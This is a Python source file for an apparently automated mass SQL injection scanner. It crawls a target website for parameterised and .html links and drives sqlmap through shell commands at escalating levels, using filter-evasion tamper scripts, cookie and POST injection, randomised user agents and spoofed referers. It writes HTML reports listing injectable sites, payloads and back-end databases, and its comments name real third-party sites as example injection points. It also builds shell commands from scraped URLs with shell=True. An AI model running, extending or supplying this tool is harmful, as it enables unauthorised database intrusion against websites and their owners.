# -*- coding:utf-8 -*-
import subprocess
import os
import random
import re
import requests
import time
import multiprocessing
from bs4 import BeautifulSoup
import sys

requests.packages.urllib3.disable_warnings()

os_python = os.path.join(os.getcwd(), 'lib\python.exe')
os_sqlmap = os.path.join(os.getcwd(), 'lib\sqlmap\\')
os_run = os_python + ' ' + os_sqlmap


def writedata(x):
    with open('log.txt', 'a+')as aa:
        aa.write('***********************************' + '\n')
        aa.write(str(time.strftime('%Y-%m-%d:%H:%M:%S   ', time.localtime())) + x + '\n')


REFERERS = [
    "https://www.baidu.com",
    "http://www.baidu.com",
    "https://www.google.com.hk",
    "http://www.so.com",
    "http://www.sogou.com",
    "http://www.soso.com",
    "http://www.bing.com",
]

headerss = [
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/22.0.1207.1 Safari/537.1",
    "Mozilla/5.0 (X11; CrOS i686 2268.111.0) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6",
    "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1090.0 Safari/536.6",
    "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/19.77.34.5 Safari/537.1",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5",
    "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.36 Safari/536.5",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3",
    "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3",
    "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3",
    "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
    "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
    "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.0 Safari/536.3",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24",
    "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24"]

headers = {
    'User-Agent': random.choice(headerss),
    'Accept': 'Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Cache-Control': 'max-age=0',
    'referer': random.choice(REFERERS),
    'Accept-Charset': 'GBK,utf-8;q=0.7,*;q=0.3',
}


def get_baidu_weights(url):
    time.sleep(random.randint(1, 5))
    x = str(random.randint(1, 9))
    data = {
        't': 'rankall',
        'on': 1,
        'type': 'baidupc',
        'callback': 'jQuery111303146901980779846_154444474116%s' % (x),
        'host': url
    }

    headers = {

        'Accept': 'text/javascript, application/javascript, application/ecmascript, application/x-ecmascript, */*; q=0.01',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Cookie': 'UM_distinctid=165af67ee6f352-07238a34ed3941-9393265-1fa400-165af67ee70473; CNZZDATA5082706=cnzz_eid%3D832961605-1544438317-null%26ntime%3D1544443717; Hm_lvt_aecc9715b0f5d5f7f34fba48a3c511d6=1544443985; Hm_lpvt_aecc9715b0f5d5f7f34fba48a3c511d6=1544443985; qHistory=aHR0cDovL3JhbmsuY2hpbmF6LmNvbS9iYWlkdW1vYmlsZS8r55m+5bqm56e75Yqo5p2D6YeNfGh0dHA6Ly9yYW5rLmNoaW5hei5jb20vcmFua2FsbC8r5p2D6YeN57u85ZCI5p+l6K+ifGh0dHA6Ly9yYW5rLmNoaW5hei5jb20r55m+5bqm5p2D6YeN5p+l6K+ifGh0dHA6Ly9pbmRleC5jaGluYXouY29tLyvlhbPplK7or43lhajnvZHmjIfmlbB8aHR0cDovL3JhbmsuY2hpbmF6LmNvbS9yYW5rL2hpc3RvcnkuYXNweCvmnYPph43ljoblj7Lmn6Xor6I=',
        'Host': 'rank.chinaz.com',
        'Origin': 'http://rank.chinaz.com',
        'Referer': 'http://rank.chinaz.com',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36',
        'X-Requested-With': 'XMLHttpRequest'

    }
    try:
        urls = 'http://rank.chinaz.com/ajaxseo.aspx?t=rankall&on=1&type=undefined&callback=jQuery111303146901980779846_154444474116%s' % (
            x)

        r = requests.post(url=urls, headers=headers, data=data)
        try:
            res = re.search(b',"br":(\d),"beforBr', r.content).group(1)
        except:
            pass
        if res:
            return res.decode()
        else:
            return '0'
    except:
        return '获取失败'


# url,title,weights,ip,ages,whois_id,whois_type,whois_name,whois_time
# 网址，标题，百度权重，ip信息，年龄，备案号，备案性质，备案名称，备案时间
# include_baidu,request,text,service,language
# 百度收录，，协议类型，页面类型，服务器类型，程序语言
title_parrten = 'class="w61-0"><div class="ball">(.*?)</div></td>'  # group(1) 正常
ip_parrten = '>IP：(.*?)</a></div>'  # group(1) 正常
# 下面会报错
ages = '" target="_blank">(.*?)</a></div></div>'  # group(1)
whois_id = '备案号：</span><a href=.*?" target="_blank">(.*?)</a></div>'  # 需group(1)
whois_type = '<span>性质：</span><strong>(.*?)</strong></div>'  # 需group(1)
whois_name = '<span>名称：</span><strong>(.*?)</strong></div>'  # 需group(1)
whois_time = '<span>审核时间：</span><strong>(.*?)</strong></div>'  # 需group(1)
include_baidu = '<div class="Ma01LiRow w12-1 ">(.*?)</div>'  # group(1)
infos = '<div class="MaLi03Row w180">(.*?)</div>'  # 要findall 0，1，2，3


def get_info(pattren, result):
    try:
        res = re.search(pattren, result).group(1)
        return res
    # return str(res.encode('utf-8'))
    except:
        return '暂无信息'


def scan_seo(url):
    UA = random.choice(headerss)
    headers = {'User-Agent': UA}
    domain_url = url.replace('https://', '').replace('http://', '').replace('www.', '').split('/')[0]
    urls = 'http://seo.chinaz.com/' + domain_url
    # url,title,weights,ip,ages,whois_id,whois_type,whois_name,whois_time
    # 网址，标题，百度权重，ip信息，年龄，备案号，备案性质，备案名称，备案时间
    # include_baidu,request,text,service,language
    # 百度收录，，协议类型，页面类型，服务器类型，程序语言
    res = {}
    try:
        req = requests.get(urls, headers, verify=False,timeout=20)
        encoding = requests.utils.get_encodings_from_content(req.text)[0]
        r = req.content.decode(encoding, 'replace')
    except Exception as e:
        writedata(str(e))
        return None

    res['百度权重'] = str(get_baidu_weights(url))
    res['网站主页'] = url.split('//')[0] + '//' + url.split('//')[1].split('/')[0]

    try:
        req1 = requests.get(url=url, headers=headers, verify=False, timeout=10)
        encoding = requests.utils.get_encodings_from_content(req1.text)[0]
        rress = req1.content.decode(encoding, 'replace')
        title_pattern = '<title>(.*?)</title>'
        title = re.search(title_pattern, rress, re.S | re.I)
        res['网站标题'] = str(title.group(1))
    except:
        res['网站标题'] = url.split('//')[0] + '//' + url.split('//')[1].split('/')[0]

    ip_infos = get_info(ip_parrten, r)
    if '[' in ip_infos:
        ip, address = ip_infos.split('[')[0], ip_infos.split('[')[1]
        res['IP__坐标'] = address.replace(']', '')
        res['所属__IP'] = ip
    else:
        res['IP__坐标'] = '获取失败'
        res['所属__IP'] = '获取失败'

    res['网站年龄'] = get_info(ages, r)
    res['备案编号'] = get_info(whois_id, r)
    res['备案性质'] = get_info(whois_type, r)
    res['备案名称'] = get_info(whois_name, r)
    res['备案时间'] = get_info(whois_time, r)
    res['百度收录'] = get_info(include_baidu, r)

    dd = re.findall(infos, r, re.S)
    resu = ['暂无信息' if x.replace(' ', '') is '' else x for x in dd]
    try:
        res['协议类型'] = resu[0]
    except:
        res['协议类型'] = '获取失败'

    try:
        res['页面类型'] = resu[1]
    except:
        res['页面类型'] = '获取失败'

    try:
        res['服务类型'] = resu[2]
    except:
        res['服务类型'] = '获取失败'

    try:
        res['程序语言'] = resu[3]
    except:
        res['程序语言'] = '获取失败'
    return res

 

def get_links(url):
    '''
    需要的有常规的注入点
        1. category.php?id=17
        2. https://www.yamibuy.com/cn/brand.php?id=566
    伪静态
        1. info/1024/4857.htm
        2. http://news.hnu.edu.cn/zhyw/2017-11-11/19605.html
        3. http://www.labothery-tea.cn/chanpin/2018-07-12/4.html
    :param url:
    :return:
    '''
    time.sleep(random.randint(1,6))
    # if 'gov.cn' in url or 'edu.cn' in url:
    #     #return 0
    #     pass
    domain = url.split('//')[1].strip('/').replace('www.', '')
    result = []
    id_links = []
    html_links = []
    result_links = {}
    html_links_s = []
    result_links['title'] = '网址标题获取失败'
    idid = []
    htht = []
    try:
        headers = {
            'User-Agent': random.choice(headerss),
            'Accept': 'Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Cache-Control': 'max-age=0',
            'Accept-Charset': 'GBK,utf-8;q=0.7,*;q=0.3',
        }
        rxww = requests.get(url, headers=headers,verify=False, timeout=10)
        soup = BeautifulSoup(rxww.content, 'html.parser',from_encoding='iso-8859-1')

        try:
            encoding = requests.utils.get_encodings_from_content(rxww.text)[0]
            res = rxww.content.decode(encoding, 'replace')
            title_pattern = '<title>(.*?)</title>'
            title = re.search(title_pattern, res, re.S | re.I)
            result_links['title'] = str(title.group(1))
        except:
            pass


        if result_links['title'] == '' or result_links['title'] == None:
            result_links['title'] = '网址标题获取失败'

        links = soup.findAll('a')
        for link in links:
            _url = link.get('href')
            res = re.search('(javascript|:;|#|%)', str(_url))
            res1 = re.search('.(jpg|png|bmp|mp3|wma|wmv|gz|zip|rar|iso|pdf|txt)', str(_url))
            if res == None and res1 == None:
                result.append(str(_url))
            else:
                pass
        # print(result)
        # time.sleep(50)
        if result != []:
            rst = list(set(result))
            for rurl in rst:
                if '//' in rurl and 'http' in rurl and domain in rurl:
                    # http // domain 都在

                    # https://www.yamibuy.com/cn/search.php?tags=163
                    # http://news.hnu.edu.cn/zhyw/2017-11-11/19605.html
                        if '?' in rurl and '=' in rurl:
                            # result_links.append(rurl)
                            id_links.append(rurl)
                        if '.html' in rurl or '.shtml' in rurl or '.htm' in rurl or '.shtm' in rurl:
                            if '?' not in rurl:
                                # result_links.append(rurl)
                                html_links.append(rurl)
                # //wmw.dbw.cn/system/2018/09/25/001298805.shtml
                if 'http' not in rurl and domain in rurl:
                    # http 不在    domain 在
                    if '?' in rurl and '=' in rurl:
                        id_links.append('http://' + rurl.lstrip('/'))
                    if '.html' in rurl or '.shtml' in rurl or '.htm' in rurl or '.shtm' in rurl:
                        if '?' not in rurl:
                            html_links.append('http://' + rurl.lstrip('/'))

                # /chanpin/2018-07-12/3.html"
                if 'http' not in rurl and domain not in rurl:
                    # http 不在  domain 不在
                    if '?' in rurl and '=' in rurl:
                        id_links.append('http://' + domain + '/' + rurl.lstrip('/'))
                    if '.html' in rurl or '.shtml' in rurl or '.htm' in rurl or '.shtm' in rurl:
                        if '?' not in rurl:
                            html_links.append('http://' + domain + '/' + rurl.lstrip('/'))

                # if 'http' not in rurl and domain not in rurl:
                #     # search.php?tags=163
                #     if '?' in rurl and '=' in rurl:
                #         # result_links.append(url + '/' + rurl)
                #         id_links.append(url + '/' + rurl)
                #     if '.html' in rurl or '.shtml' in rurl or '.htm' in rurl or '.shtm' in rurl:
                #         # result_links.append(url + '/' + rurl)
                #         if '?' not in rurl:
                #             html_links.append(url + '/' + rurl)

            for x1 in html_links:
                try:
                    rx1 = requests.head(url=x1, headers=headers,timeout=15).status_code
                    if rx1 == 200:
                        htht.append(x1)
                except Exception as e:
                    writedata('[WARNING ERROR]' + str(e))
                    pass
            for x2 in id_links:
                try:
                    rx2 = requests.head(url=x2, headers=headers,timeout=15).status_code
                    if rx2 == 200:
                        idid.append(x2)
                except Exception as e:
                    writedata('[WARNING ERROR]' + str(e))
                    pass

            if htht == []:
                pass
            else:
                result_links['html_links'] = htht

            if idid == []:
                pass
            else:
                result_links['id_links'] = idid

            # if htht == []:
            #     pass
            # else:
            #     for x in htht:
            #         if x.count('/') > 3:
            #             ra = re.search('.*?/[0-9]\.', str(x))
            #             if ra == None:
            #                 pass
            #             else:
            #                 html_links_s.append(x)
            #             if html_links_s == []:
            #                 html_links_s.append(random.choice(htht))
            #
            #     if html_links_s == []:
            #         result_links['html_links'] = random.choice(htht)
            #     else:
            #         result_links['html_links'] = random.choice(html_links_s)
            #
            # if idid == []:
            #     pass
            # else:
            #     result_links['id_links'] = random.choice(idid)

        if result_links == {}:
            return None
        else:
            return result_links

    except Exception as e:
        writedata('[WARNING ERROR]' + str(e))
        pass
    return None


def check(result, url, common, ):
    url = url.replace('^', '')
    if '---' in result:
        domain_values = scan_seo(url)
        if 'sqlmap was not able to fingerprint the back-end database management syste' not in result:
            try:
                result_info = re.search('---(.*?)---.*?\[INFO\] (the back-end DBMS is .*?)\[', result, re.S)
                inj = result_info.group(1)
                dbs = result_info.group(2)
                with open('LAnGZi_SQL_Injection_Report.html', 'a+', encoding='utf-8') as ae:
                    ae.write('''
                    <div class="col-md-12 font-weight-bold"><br>
                    <div class="panel panel-primary">
                        <div class="panel-heading">
                            网站漏洞报表
                        </div>
                        <div class="panel-body">
                            <table class="table">
                
                                <tr>
                                    <td>发现时间</td>
                    <td>{}</td>
                </tr>


                <tr>
                    <td>网站标题</td>
                    <td>{}</td>
                </tr>


                <tr>
                    <td>注入网址</td>
                    <td>{}</td>
                </tr>
                <tr>
                    <td>执行命令</td>
                    <td>{}</td>
                </tr>
                '''.format(str(time.strftime('%Y-%m-%d:%H:%M:%S', time.localtime())),
                                     domain_values.get('网站标题'),
                                     url,
                                     common
                                     ))


                    ae.write(inj.replace('Parameter: ', '<tr><td>注入参数(方式)</td><td> ').replace('Type: ', '</td></tr><tr class="active"><td>&nbsp;&nbsp;&nbsp;&nbsp;注入方式</td><td>').replace
                ('Title: ','</td></tr><tr><td>&nbsp;&nbsp;&nbsp;&nbsp;注入标题</td><td>').replace(
                        'Payload: ', '</td></tr><tr><td>&nbsp;&nbsp;&nbsp;&nbsp;注入攻击</td><td>')+'</td></tr>')


                    if 'back-end DBMS' in dbs:
                        ae.write(dbs.replace('the back-end DBMS is ', '<tr><td>数据库类型</td><td> ').replace('web server operating system: ','</td></tr><tr><td>服务器版本</td><td>').replace(
                                'web application technology: ', '</td></tr><tr><td>服务器语言</td><td>').replace('back-end DBMS: ', '</td></tr><tr><td>数据库版本</td><td>')+'</td></tr>')


                    else:
                        ae.write('''
                     <tr>
                        <td>出现拦截</td>
                        <td>可能存在注入但被拦截,或者无法识别数据库版本</td>
                    </tr>
                        ''')
                    ae.write('''
                    </table>
        </div>


        <div class="panel-footer">
            网站信息报表
        </div>

        <div class="panel-body">

            <table class="table">

                <tr>
                    <td>百度权重</td>
                    <td>{}</td>
                </tr>
                <tr>
                    <td>网站主页</td>
                    <td>{}</td>
                </tr>
                <tr>
                    <td>网站标题</td>
                    <td>{}</td>
                </tr>
                <tr>
                    <td>IP__坐标</td>
                    <td>{}</td>
                </tr>
                <tr>
                    <td>所属__IP</td>
                    <td>{}</td>
                </tr>
                <tr>
                    <td>网站年龄</td>
                    <td>{}</td>
                </tr>
                <tr>
                    <td>备案编号</td>
                    <td>{}</td>
                </tr>
                <tr>
                    <td>备案性质</td>
                    <td>{}</td>
                </tr>
                <tr>
                    <td>备案名称</td>
                    <td>{}</td>
                </tr>
                <tr>
                    <td>备案时间</td>
                    <td>{}</td>
                </tr>
                <tr>
                    <td>百度收录</td>
                    <td>{}</td>
                </tr>
                <tr>
                    <td>协议类型</td>
                    <td>{}</td>
                </tr>
                <tr>
                    <td>页面类型</td>
                    <td>{}</td>
                </tr>
                <tr>
                    <td>服务类型</td>
                    <td>{}</td>
                </tr>
                <tr>
                    <td>程序语言</td>
                    <td>{}</td>
                                </tr>
                            </table>
                
                        </div>
                
                    </div>
                </div>

                    
                    '''.format(domain_values.get('百度权重'),
                               domain_values.get('网站主页'),
                               domain_values.get('网站标题'),
                               domain_values.get('IP__坐标'),
                               domain_values.get('所属__IP'),
                               domain_values.get('网站年龄'),
                               domain_values.get('备案编号'),
                               domain_values.get('备案性质'),
                               domain_values.get('备案名称'),
                               domain_values.get('备案时间'),
                               domain_values.get('百度收录'),
                               domain_values.get('协议类型'),
                               domain_values.get('页面类型'),
                               domain_values.get('服务类型'),
                               domain_values.get('程序语言')))

                # with open('result.txt', 'a+', encoding='utf-8') as ae:
                #     ae.write('-------------------------------------------------\n')
                #     ae.write('发现时间 : ' + str(time.strftime('%Y-%m-%d:%H:%M:%S', time.localtime())) + '\n')
                #     ae.write('网站标题 : ' + title + '\n')
                #     ae.write('注入网址 : ' + url + '\n')
                #     ae.write('执行命令 : ' + common + '\n')
                #     ae.write(inj.replace('Parameter: ', '注入参数(方式) : ').replace('Type: ', '注入方式 : ').replace('Title: ',
                #                                                                                             '注入标题 : ').replace(
                #         'Payload: ', '注入攻击 : ') + '\n')
                #     if 'back-end DBMS' in dbs:
                #         ae.write(
                #             dbs.replace('the back-end DBMS is ', '数据库类型 : ').replace('web server operating system: ',
                #                                                                      '服务器版本 : ').replace(
                #                 'web application technology: ', '服务器语言 : ').replace('back-end DBMS: ',
                #                                                                     '数据库版本 : ') + '\n')
                #     else:
                #         ae.write('\n' + '可能存在注入但被拦截,或者无法识别数据库版本' + '\n')

                    return 'INJ'
            except Exception as e:
                writedata('[WARNING ERROR]' + str(e))


        else:
            try:
                result_info = re.search('---(.*?)---.*?INFO\] (.*?)\[', result, re.S)
                inj = result_info.group(1)
                with open('LAnGZi_SQL_Injection_Report.html', 'a+', encoding='utf-8') as ae:
                    ae.write('''
                            <div class="col-md-12 font-weight-bold"><br>
                            <div class="panel panel-primary">
                                <div class="panel-heading">
                                    网站漏洞报表
                                </div>
                                <div class="panel-body">
                                    <table class="table">

                                        <tr>
                                            <td>发现时间</td>
                            <td>{}</td>
                        </tr>


                        <tr>
                            <td>网站标题</td>
                            <td>{}</td>
                        </tr>


                        <tr>
                            <td>注入网址</td>
                            <td>{}</td>
                        </tr>
                        <tr>
                            <td>执行命令</td>
                            <td>{}</td>
                        </tr>
                        '''.format(str(time.strftime('%Y-%m-%d:%H:%M:%S', time.localtime())),
                                   domain_values.get('网站标题'),
                                   url,
                                   common
                                   ))

                    ae.write(inj.replace('Parameter: ', '<tr><td>注入参数(方式)</td><td> ').replace('Type: ',
                                                                                              '</td></tr><tr class="active"><td>注入方式</td><td>').replace
                             ('Title: ', '</td></tr><tr><td>注入标题</td><td>').replace(
                        'Payload: ', '</td></tr><tr><td>注入攻击</td><td>') + '</td></tr>')


                    ae.write('''
                     <tr>
                        <td>出现拦截</td>
                        <td>可能存在注入但被拦截,或者无法识别数据库版本</td>
                    </tr>
                        ''')
                    ae.write('''
                            </table>
                </div>


                <div class="panel-footer">
                    网站信息报表
                </div>

                <div class="panel-body">

                    <table class="table">

                        <tr>
                            <td>百度权重</td>
                            <td>{}</td>
                        </tr>
                        <tr>
                            <td>网站主页</td>
                            <td>{}</td>
                        </tr>
                        <tr>
                            <td>网站标题</td>
                            <td>{}</td>
                        </tr>
                        <tr>
                            <td>IP__坐标</td>
                            <td>{}</td>
                        </tr>
                        <tr>
                            <td>所属__IP</td>
                            <td>{}</td>
                        </tr>
                        <tr>
                            <td>网站年龄</td>
                            <td>{}</td>
                        </tr>
                        <tr>
                            <td>备案编号</td>
                            <td>{}</td>
                        </tr>
                        <tr>
                            <td>备案性质</td>
                            <td>{}</td>
                        </tr>
                        <tr>
                            <td>备案名称</td>
                            <td>{}</td>
                        </tr>
                        <tr>
                            <td>备案时间</td>
                            <td>{}</td>
                        </tr>
                        <tr>
                            <td>百度收录</td>
                            <td>{}</td>
                        </tr>
                        <tr>
                            <td>协议类型</td>
                            <td>{}</td>
                        </tr>
                        <tr>
                            <td>页面类型</td>
                            <td>{}</td>
                        </tr>
                        <tr>
                            <td>服务类型</td>
                            <td>{}</td>
                        </tr>
                        <tr>
                            <td>程序语言</td>
                            <td>{}</td>
                                        </tr>
                                    </table>

                                </div>

                            </div>
                        </div>


                            '''.format(domain_values.get('百度权重'),
                                       domain_values.get('网站主页'),
                                       domain_values.get('网站标题'),
                                       domain_values.get('IP__坐标'),
                                       domain_values.get('所属__IP'),
                                       domain_values.get('网站年龄'),
                                       domain_values.get('备案编号'),
                                       domain_values.get('备案性质'),
                                       domain_values.get('备案名称'),
                                       domain_values.get('备案时间'),
                                       domain_values.get('百度收录'),
                                       domain_values.get('协议类型'),
                                       domain_values.get('页面类型'),
                                       domain_values.get('服务类型'),
                                       domain_values.get('程序语言')))
                # with open('result.txt', 'a+', encoding='utf-8') as ae:
                #     ae.write('-------------------------------------------------\n')
                #     ae.write('发现时间 : ' + str(time.strftime('%Y-%m-%d:%H:%M:%S', time.localtime())) + '\n')
                #     ae.write('网站标题 : ' + title + '\n')
                #     ae.write('注入网址 : ' + url + '\n')
                #     ae.write('执行命令 : ' + common + '\n')
                #     ae.write(inj.replace('Parameter: ', '注入参数(方式) : ').replace('Type: ', '注入方式 : ').replace('Title: ',
                #                                                                                             '注入标题 : ').replace(
                #         'Payload: ', '注入攻击 : ') + '\n')
                #     ae.write('\n' + '存在注入但无法识别数据库版本' + '\n')
                    return 'INJ'
            except Exception as e:
                writedata('[WARNING ERROR]' + str(e))


def scan_level_0(url):
    """

    :rtype: object
    """
    url = url.replace('&', '^&')
    comm = os_run + 'sqlmap.py -u %s --technique B --batch --thread=10 --random-agent' % url
    print('Level 0 : ' + url.replace('^', '').replace('*', ''))
    writedata(comm)
    try:
        res = subprocess.Popen(comm, shell=True, stdout=subprocess.PIPE)
        result = res.stdout.read().decode()
        writedata(result)
        inj = check(result, url=url, common=comm)
    except Exception as e:
        writedata('[WARNING ERROR]' + str(e))
        pass
    finally:
        res.terminate()
        return inj


def scan_level_1(url):
    url = url.replace('&', '^&')
    comm = os_run + 'sqlmap.py -u %s --batch --thread=10 --random-agent' % url
    print('Level 1 : ' + url.replace('^', '').replace('*', ''))
    writedata(comm)
    try:
        res = subprocess.Popen(comm, shell=True, stdout=subprocess.PIPE)
        result = res.stdout.read().decode()
        writedata(result)
        inj = check(result, url=url, common=comm)
    except Exception as e:
        writedata('[WARNING ERROR]' + str(e))
        pass
    finally:
        res.terminate()
        return inj


def scan_level_2(url):
    urls, datas = url.split('?')[0], url.split('?')[1]
    urls = urls.replace('&', '^&')
    datas = datas.replace('&', '^&')
    comm_cookie = os_run + "sqlmap.py -u {} --cookie {} --level 2 --batch --thread=10 --random-agent".format(urls,
                                                                                                             datas)
    print('Level 2 : ' + url.replace('^', '').replace('*', ''))
    comm_post = os_run + "sqlmap.py -u {} --data {} --level 2 --batch --thread=10 --random-agent".format(urls, datas)
    writedata(comm_post)
    writedata(comm_cookie)

    try:
        res = subprocess.Popen(comm_cookie, shell=True, stdout=subprocess.PIPE)
        result = res.stdout.read().decode()
        writedata(result)
        inj = check(result, url=url, common=comm_cookie)
    except Exception as e:
        writedata('[WARNING ERROR]' + str(e))
        pass
    finally:
        res.terminate()
        if inj == 'INJ':
            return inj

    try:
        res = subprocess.Popen(comm_post, shell=True, stdout=subprocess.PIPE)
        result = res.stdout.read().decode()
        writedata(result)
        inj = check(result, url=url, common=comm_post)
    except Exception as e:
        writedata('[WARNING ERROR]' + str(e))
        pass
    finally:
        res.terminate()
        return inj


def scan_level_3(url):
    url = url.replace('&', '^&')
    comm = os_run + 'sqlmap.py -u %s --batch --tamper space2comment.py --thread=10 --random-agent' % url
    print('Level 3 : ' + url.replace('^', '').replace('*', ''))
    writedata(comm)
    try:
        res = subprocess.Popen(comm, shell=True, stdout=subprocess.PIPE)
        result = res.stdout.read().decode()
        writedata(result)

        inj = check(result, url=url, common=comm)
    except Exception as e:
        writedata('[WARNING ERROR]' + str(e))
        pass
    finally:
        res.terminate()
        return inj


def scan_level_4(url):
    urls, datas = url.split('?')[0], url.split('?')[1]
    urls = urls.replace('&', '^&')
    datas = datas.replace('&', '^&')
    comm_cookie = os_run + "sqlmap.py -u {} --cookie {} --level 2 --tamper space2comment.py --batch --thread=10 --random-agent".format(
        urls, datas)
    print('Level 4 : ' + url.replace('^', '').replace('*', ''))
    comm_post = os_run + "sqlmap.py -u {} --data {} --level 2 --tamper space2comment.py --batch --thread=10 --random-agent".format(
        urls, datas)
    writedata(comm_cookie)
    writedata(comm_post)

    try:
        res = subprocess.Popen(comm_cookie, shell=True, stdout=subprocess.PIPE)
        result = res.stdout.read().decode()
        writedata(result)

        inj = check(result, url=url, common=comm_cookie)
    except Exception as e:
        writedata('[WARNING ERROR]' + str(e))
        pass
    finally:
        res.terminate()
        if inj == 'INJ':
            return inj

    try:
        res = subprocess.Popen(comm_post, shell=True, stdout=subprocess.PIPE)
        result = res.stdout.read().decode()
        writedata(result)
        inj = check(result, url=url, common=comm_post)
    except Exception as e:
        writedata('[WARNING ERROR]' + str(e))
        pass
    finally:
        res.terminate()
        return inj


def scan_level_5(url):
    # 获取完整注入url即可
    url = url.replace('&', '^&')
    comm = os_run + 'sqlmap.py -u {} --batch --tamper space2comment.py --delay 2 --time-sec=15 --timeout=20  --level 5 --thread=10 --random-agent'.format(
        url)
    print('Level 5 : ' + url.replace('^', '').replace('*', ''))
    writedata(comm)

    try:
        res = subprocess.Popen(comm, shell=True, stdout=subprocess.PIPE)
        result = res.stdout.read().decode()
        writedata(result)

        inj = check(result, url=url, common=comm)
    except Exception as e:
        writedata('[WARNING ERROR]' + str(e))
        pass
    finally:
        res.terminate()
        return inj


def scan_html(url, level):
    urlse = url.replace('.htm', '*.htm').replace('.shtm', '*.shtm')
    urls = urlse.replace('&', '^&')
    if level == 1 or level == 2 or level == 0:
        comm = os_run + 'sqlmap.py -u {} --batch --thread=10 --random-agent'.format(urls)
        if level == 1:
            print('Level 1 : ' + urls.replace('^', '').replace('*', ''))
        if level == 2:
            print('Level 2 : ' + urls.replace('^', '').replace('*', ''))
        if level == 0:
            print('Level 0 : ' + urls.replace('^', '').replace('*', ''))

    if level == 3 or level == 4 or level == 6:
        comm = os_run + 'sqlmap.py -u %s --batch --tamper space2comment.py --thread=10 --random-agent' % urls
        if level == 3:
            print('Level 3 : ' + urls.replace('^', '').replace('*', ''))
        if level == 4:
            print('Level 4 : ' + urls.replace('^', '').replace('*', ''))
        if level == 6:
            print('Level 6 : ' + urls.replace('^', '').replace('*', ''))
    if level == 5:
        comm = os_run + 'sqlmap.py -u {} --batch --tamper space2comment.py --delay 2 --time-sec=15 --timeout=20  --level 5 --thread=10 --random-agent'.format(
            urls)
        print('Level 5 : ' + urls.replace('^', '').replace('*', ''))
    writedata(comm)

    try:
        res = subprocess.Popen(comm, shell=True, stdout=subprocess.PIPE)
        result = res.stdout.read().decode()
        writedata(result)

        inj = check(result, url=url, common=comm)
    except Exception as e:
        writedata('[WARNING ERROR]' + str(e))
        pass
    finally:
        res.terminate()
        return inj



def get_url_sql(url, level=1):
    link = get_links(url)
    html_links = []
    id_links = []
    if link == None:
        pass
    else:
        if 'html_links' in link.keys():
            if len(link.get('html_links'))<=3:
                html_links = link.get('html_links')
            else:
                html_links = random.sample(link.get('html_links'),3)
            for html_link in html_links:
                dix = scan_html(html_link,  level)
                if dix != None:
                    return
                
        if 'id_links' in link.keys():
            if len(link.get('id_links'))<=3:
                id_links = link.get('id_links')
            else:
                id_links = random.sample(link.get('id_links'),3)
            for id_link in id_links:
                if level == 0:
                    scan_level_0(id_link.strip())
                if level == 1:
                    scan_level_1(id_link.strip())
                if level == 2:
                    scan_level_2(id_link.strip())
                if level == 3:
                    scan_level_3(id_link.strip())
                if level == 4:
                    scan_level_4(id_link.strip())
                if level == 5:
                    scan_level_5(id_link.strip())
                if level == 6:
                    dix0 = scan_level_0(id_link.strip())
                    if dix0 != None:
                        return dix0
    
                    dix1 = scan_level_1(id_link.strip())
                    if dix1 != None:
                        return dix1
                    dix2 = scan_level_2(id_link.strip())
                    if dix2 != None:
                        return dix2
                    dix3 = scan_level_3(id_link.strip())
                    if dix3 != None:
                        return dix3
                    dix4 = scan_level_4(id_link.strip())
                    if dix4 != None:
                        return dix4
                    dix5 = scan_level_5(id_link.strip())
                    if dix5 != None:
                        return dix5


if __name__ == '__main__':
    if os.path.exists('LAnGZi_SQL_Injection_Report.html'):
        pass
    else:
        with open('LAnGZi_SQL_Injection_Report.html','a+',encoding='utf-8')as e:
            e.write('''
                            <!DOCTYPE html>
                <html lang="en">
                <head>
                    <meta charset="UTF-8">
                    <title>LAnGZi SQL Injection Report Version 3.8</title>
                    <link rel="stylesheet" href='https://cdn.bootcss.com/bootstrap/3.3.7/css/bootstrap-theme.min.css'>
